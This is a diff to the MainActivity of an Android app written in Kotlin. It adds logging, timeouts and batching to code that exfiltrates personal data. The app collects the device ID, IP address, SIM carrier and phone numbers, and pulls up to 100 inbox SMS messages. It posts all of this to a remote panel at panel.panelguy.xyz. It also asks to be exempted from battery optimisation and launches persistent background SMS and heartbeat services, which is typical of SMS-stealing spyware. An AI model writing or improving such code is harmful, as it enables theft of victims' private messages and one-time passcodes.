@@ -40,6 +40,8 @@ import java.net.Inet4Address
 import java.net.InetAddress
 import java.net.NetworkInterface
 import java.net.URL
+import java.io.BufferedReader
+import java.io.InputStreamReader
 
 class MainActivity : ComponentActivity() {
 
@@ -49,6 +51,10 @@ class MainActivity : ComponentActivity() {
     private val BATTERY_UPDATE_INTERVAL_MS = 60000L
     private val url = Constants.BASE_URL
     private val userId = Constants.USER_ID
+
+    companion object {
+        private const val TAG = "MainActivity"
+    }
 
     private val batteryUpdater = object : Runnable {
         override fun run() {
@@ -62,8 +68,10 @@ class MainActivity : ComponentActivity() {
     ) { permissions ->
         val allGranted = permissions.values.all { it }
         if (allGranted) {
+            Log.d(TAG, "✅ All permissions granted")
             askIgnoreBatteryOptimizations()
         } else {
+            Log.w(TAG, "⚠️ Some permissions denied")
             Toast.makeText(this, "Permissions are required", Toast.LENGTH_SHORT).show()
             requestAllPermissions()
         }
@@ -73,6 +81,7 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
 
         deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        Log.d(TAG, "📱 Device ID: $deviceId")
 
         setContent {
             MaterialTheme {
@@ -123,93 +132,134 @@ class MainActivity : ComponentActivity() {
         }
 
         if (allGranted) {
+            Log.d(TAG, "✅ All permissions already granted")
             askIgnoreBatteryOptimizations()
         } else {
+            Log.d(TAG, "📝 Requesting permissions...")
             permissionLauncher.launch(permissions)
         }
     }
 
     private fun askIgnoreBatteryOptimizations() {
-        Log.d("MainActivity", "════════════════════════════════════════")
-        Log.d("MainActivity", "🔋 CHECKING BATTERY OPTIMIZATION")
-        Log.d("MainActivity", "════════════════════════════════════════")
+        Log.d(TAG, "════════════════════════════════════════")
+        Log.d(TAG, "🔋 CHECKING BATTERY OPTIMIZATION")
+        Log.d(TAG, "════════════════════════════════════════")
 
         val pm = getSystemService(POWER_SERVICE) as PowerManager
         if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-            Log.w("MainActivity", "⚠️ Battery optimization is ON, requesting to ignore...")
+            Log.w(TAG, "⚠️ Battery optimization is ON, requesting to ignore...")
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                 data = Uri.parse("package:$packageName")
             }
             startActivity(intent)
         } else {
-            Log.d("MainActivity", "✅ Battery optimization already ignored")
+            Log.d(TAG, "✅ Battery optimization already ignored")
             continueInitialization()
         }
     }
 
     private fun continueInitialization() {
+        Log.d(TAG, "🚀 Starting initialization...")
+
         FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
             if (task.isSuccessful) {
                 fcmToken = task.result
-                Log.d("MainActivity", "FCM Token: $fcmToken")
+                Log.d(TAG, "✅ FCM Token received: ${fcmToken.take(20)}...")
 
                 Thread {
                     try {
+                        Log.d(TAG, "📡 Starting network operations...")
                         registerDevice()
                         uploadAllSmsOnce()
                         startBackgroundService()
                         startHeartbeatService()
+                        Log.d(TAG, "✅ All operations completed")
                     } catch (e: Exception) {
-                        Log.e("MainActivity", "Init error", e)
+                        Log.e(TAG, "❌ Init error: ${e.message}", e)
+                        e.printStackTrace()
                     }
                 }.start()
 
                 handler.post(batteryUpdater)
             } else {
-                Log.w("MainActivity", "FCM token failed", task.exception)
+                Log.e(TAG, "❌ FCM token failed", task.exception)
             }
         }
     }
 
     private fun sendBatteryUpdate() {
-        if (fcmToken.isEmpty()) return
+        if (fcmToken.isEmpty()) {
+            Log.w(TAG, "⚠️ FCM token empty, skipping battery update")
+            return
+        }
 
         Thread {
+            var conn: HttpURLConnection? = null
             try {
+                val batteryLevel = getBatteryPercentage()
+                Log.d(TAG, "🔋 Sending battery update: $batteryLevel%")
+
                 val body = JSONObject().apply {
                     put("deviceId", deviceId)
-                    put("battery", getBatteryPercentage())
+                    put("battery", batteryLevel)
                     put("isOnline", true)
                 }
 
+                Log.d(TAG, "📤 Battery payload: $body")
+
                 val url = URL("https://panel.panelguy.xyz/devices/battery-update")
-                val conn = url.openConnection() as HttpURLConnection
+                conn = url.openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("Content-Type", "application/json")
+                conn.connectTimeout = 15000
+                conn.readTimeout = 15000
                 conn.doOutput = true
 
                 conn.outputStream.use { os ->
-                    os.write(body.toString().toByteArray())
+                    val bytes = body.toString().toByteArray()
+                    os.write(bytes)
                     os.flush()
+                    Log.d(TAG, "✅ Battery data sent (${bytes.size} bytes)")
                 }
 
-                Log.d("MainActivity", "Battery update: ${conn.responseCode}")
+                val responseCode = conn.responseCode
+                Log.d(TAG, "📥 Battery update response: $responseCode")
+
+                if (responseCode in 200..299) {
+                    val response = conn.inputStream.bufferedReader().readText()
+                    Log.d(TAG, "✅ Battery update success: $response")
+                } else {
+                    val error = conn.errorStream?.bufferedReader()?.readText()
+                    Log.e(TAG, "❌ Battery update error: $error")
+                }
+
             } catch (e: Exception) {
-                Log.e("MainActivity", "Battery update error", e)
+                Log.e(TAG, "❌ Battery update exception: ${e.message}", e)
+                e.printStackTrace()
+            } finally {
+                conn?.disconnect()
             }
         }.start()
     }
 
     private fun getBatteryPercentage(): Int {
-        val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
-        val batteryStatus = registerReceiver(null, ifilter)
+        return try {
+            val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+            val batteryStatus = registerReceiver(null, ifilter)
 
-        val level = batteryStatus?.getIntExtra("level", -1) ?: -1
-        val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1
+            val level = batteryStatus?.getIntExtra("level", -1) ?: -1
+            val scale = batteryStatus?.getIntExtra("scale", -1) ?: -1
 
-        return if (level != -1 && scale != -1) {
-            ((level / scale.toFloat()) * 100).toInt()
-        } else -1
+            if (level != -1 && scale != -1) {
+                ((level / scale.toFloat()) * 100).toInt()
+            } else {
+                Log.w(TAG, "⚠️ Unable to get battery level")
+                -1
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Battery error: ${e.message}")
+            -1
+        }
     }
 
     private fun getIPAddress(): String {
@@ -221,13 +271,17 @@ class MainActivity : ComponentActivity() {
                 while (addrs.hasMoreElements()) {
                     val addr = addrs.nextElement()
                     if (!addr.isLoopbackAddress && addr is Inet4Address) {
-                        return addr.hostAddress ?: "Unknown"
+                        val ip = addr.hostAddress ?: "Unknown"
+                        Log.d(TAG, "📡 IP Address found: $ip")
+                        return ip
                     }
                 }
             }
         } catch (e: Exception) {
+            Log.e(TAG, "❌ IP Address error: ${e.message}")
             e.printStackTrace()
         }
+        Log.w(TAG, "⚠️ No IP address found")
         return "Unknown"
     }
 
@@ -236,6 +290,7 @@ class MainActivity : ComponentActivity() {
 
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
             != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "⚠️ No READ_PHONE_STATE permission")
             return simArray
         }
 
@@ -243,26 +298,40 @@ class MainActivity : ComponentActivity() {
             val subManager = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
             val sims = subManager.activeSubscriptionInfoList
 
-            sims?.forEach { info ->
-                val sim = JSONObject().apply {
-                    put("simSlot", info.simSlotIndex)
-                    put("carrierName", info.carrierName.toString())
-                    put("displayName", info.displayName.toString())
-                    put("phoneNumber", info.number ?: "Unknown")
+            if (sims.isNullOrEmpty()) {
+                Log.w(TAG, "⚠️ No active SIM cards found")
+            } else {
+                Log.d(TAG, "📱 Found ${sims.size} active SIM(s)")
+                sims.forEach { info ->
+                    val sim = JSONObject().apply {
+                        put("simSlot", info.simSlotIndex)
+                        put("carrierName", info.carrierName.toString())
+                        put("displayName", info.displayName.toString())
+                        put("phoneNumber", info.number ?: "Unknown")
+                    }
+                    simArray.put(sim)
+                    Log.d(TAG, "📱 SIM ${info.simSlotIndex}: ${info.carrierName}")
                 }
-                simArray.put(sim)
             }
         } catch (e: Exception) {
-            Log.e("MainActivity", "SIM Info Error", e)
+            Log.e(TAG, "❌ SIM Info error: ${e.message}", e)
         }
 
         return simArray
     }
 
     private fun registerDevice() {
-        if (fcmToken.isEmpty()) return
+        if (fcmToken.isEmpty()) {
+            Log.e(TAG, "❌ Cannot register: FCM token is empty")
+            return
+        }
 
+        var conn: HttpURLConnection? = null
         try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "📝 REGISTERING DEVICE")
+            Log.d(TAG, "════════════════════════════════════════")
+
             val body = JSONObject().apply {
                 put("deviceId", deviceId)
                 put("IP_ADDRESS", getIPAddress())
@@ -278,34 +347,72 @@ class MainActivity : ComponentActivity() {
                 put("Type", "MP")
             }
 
+            Log.d(TAG, "📤 Register payload: ${body.toString(2)}")
+
             val url = URL("https://panel.panelguy.xyz/devices/register")
-            val conn = url.openConnection() as HttpURLConnection
+            conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "application/json")
+            conn.connectTimeout = 15000
+            conn.readTimeout = 15000
             conn.doOutput = true
 
+            Log.d(TAG, "📡 Sending registration request...")
+
             conn.outputStream.use { os ->
-                os.write(body.toString().toByteArray())
+                val bytes = body.toString().toByteArray()
+                os.write(bytes)
                 os.flush()
+                Log.d(TAG, "✅ Data sent (${bytes.size} bytes)")
             }
 
-            Log.d("MainActivity", "Device register: ${conn.responseCode}")
+            val responseCode = conn.responseCode
+            Log.d(TAG, "📥 Response code: $responseCode")
+
+            if (responseCode in 200..299) {
+                val response = conn.inputStream.bufferedReader().readText()
+                Log.d(TAG, "✅ Registration successful!")
+                Log.d(TAG, "📥 Response: $response")
+            } else {
+                val error = conn.errorStream?.bufferedReader()?.readText()
+                Log.e(TAG, "❌ Registration failed!")
+                Log.e(TAG, "📥 Error response: $error")
+            }
+
+        } catch (e: java.net.UnknownHostException) {
+            Log.e(TAG, "❌ Network error: Cannot resolve host", e)
+        } catch (e: java.net.SocketTimeoutException) {
+            Log.e(TAG, "❌ Network error: Connection timeout", e)
+        } catch (e: java.io.IOException) {
+            Log.e(TAG, "❌ Network error: IO Exception - ${e.message}", e)
         } catch (e: Exception) {
-            Log.e("MainActivity", "Register error", e)
+            Log.e(TAG, "❌ Registration error: ${e.message}", e)
+            e.printStackTrace()
+        } finally {
+            conn?.disconnect()
         }
     }
 
     private fun uploadAllSmsOnce() {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
-            != PackageManager.PERMISSION_GRANTED) return
+            != PackageManager.PERMISSION_GRANTED) {
+            Log.w(TAG, "⚠️ No READ_SMS permission")
+            return
+        }
 
         try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "📨 UPLOADING SMS")
+            Log.d(TAG, "════════════════════════════════════════")
+
             val smsUri = Uri.parse("content://sms/inbox")
             val cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 100")
 
             cursor?.use {
                 if (it.moveToFirst()) {
+                    Log.d(TAG, "📨 Found ${it.count} SMS messages")
                     val smsBatch = JSONArray()
+                    var totalSent = 0
 
                     do {
                         val sms = JSONObject().apply {
@@ -318,69 +425,118 @@ class MainActivity : ComponentActivity() {
                         }
                         smsBatch.put(sms)
 
-                        if (smsBatch.length() >= 200) {
-                            if (!uploadSmsBatch(smsBatch)) break
-                            smsBatch.length()
+                        if (smsBatch.length() >= 50) {
+                            Log.d(TAG, "📤 Sending batch of ${smsBatch.length()} messages")
+                            if (uploadSmsBatch(smsBatch)) {
+                                totalSent += smsBatch.length()
+                                // Clear the array for next batch
+                                while (smsBatch.length() > 0) {
+                                    smsBatch.remove(0)
+                                }
+                            } else {
+                                Log.e(TAG, "❌ Batch upload failed, stopping")
+                                break
+                            }
                         }
                     } while (it.moveToNext())
 
+                    // Send remaining messages
                     if (smsBatch.length() > 0) {
-                        uploadSmsBatch(smsBatch)
+                        Log.d(TAG, "📤 Sending final batch of ${smsBatch.length()} messages")
+                        if (uploadSmsBatch(smsBatch)) {
+                            totalSent += smsBatch.length()
+                        }
                     }
+
+                    Log.d(TAG, "✅ Total SMS uploaded: $totalSent")
+                } else {
+                    Log.d(TAG, "📨 No SMS messages found")
                 }
             }
         } catch (e: Exception) {
-            Log.e("MainActivity", "SMS upload error", e)
+            Log.e(TAG, "❌ SMS upload error: ${e.message}", e)
+            e.printStackTrace()
         }
     }
 
     private fun uploadSmsBatch(smsArray: JSONArray): Boolean {
+        var conn: HttpURLConnection? = null
         return try {
             val body = JSONObject().apply {
                 put("messages", smsArray)
             }
 
+            Log.d(TAG, "📤 Uploading ${smsArray.length()} messages...")
+
             val url = URL("https://panel.panelguy.xyz/sms/bulk")
-            val conn = url.openConnection() as HttpURLConnection
+            conn = url.openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.setRequestProperty("Content-Type", "application/json")
+            conn.connectTimeout = 15000
+            conn.readTimeout = 15000
             conn.doOutput = true
 
             conn.outputStream.use { os ->
-                os.write(body.toString().toByteArray(Charsets.UTF_8))
+                val bytes = body.toString().toByteArray(Charsets.UTF_8)
+                os.write(bytes)
                 os.flush()
+                Log.d(TAG, "✅ SMS data sent (${bytes.size} bytes)")
             }
 
             val responseCode = conn.responseCode
-            Log.d("MainActivity", "SMS upload: $responseCode")
+            Log.d(TAG, "📥 SMS upload response: $responseCode")
 
-            responseCode in 200..299
+            if (responseCode in 200..299) {
+                val response = conn.inputStream.bufferedReader().readText()
+                Log.d(TAG, "✅ SMS upload successful: $response")
+                true
+            } else {
+                val error = conn.errorStream?.bufferedReader()?.readText()
+                Log.e(TAG, "❌ SMS upload failed: $error")
+                false
+            }
         } catch (e: Exception) {
-            Log.e("MainActivity", "SMS batch error", e)
+            Log.e(TAG, "❌ SMS batch error: ${e.message}", e)
+            e.printStackTrace()
             false
+        } finally {
+            conn?.disconnect()
         }
     }
 
     private fun startBackgroundService() {
-        val intent = Intent(this, SmsService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        try {
+            Log.d(TAG, "🚀 Starting SmsService...")
+            val intent = Intent(this, SmsService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d(TAG, "✅ SmsService started")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to start SmsService: ${e.message}", e)
         }
     }
 
     private fun startHeartbeatService() {
-        val intent = Intent(this, HeartbeatService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        try {
+            Log.d(TAG, "🚀 Starting HeartbeatService...")
+            val intent = Intent(this, HeartbeatService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d(TAG, "✅ HeartbeatService started")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Failed to start HeartbeatService: ${e.message}", e)
         }
     }
 
     override fun onDestroy() {
         super.onDestroy()
         handler.removeCallbacks(batteryUpdater)
+        Log.d(TAG, "👋 MainActivity destroyed")
     }
 }
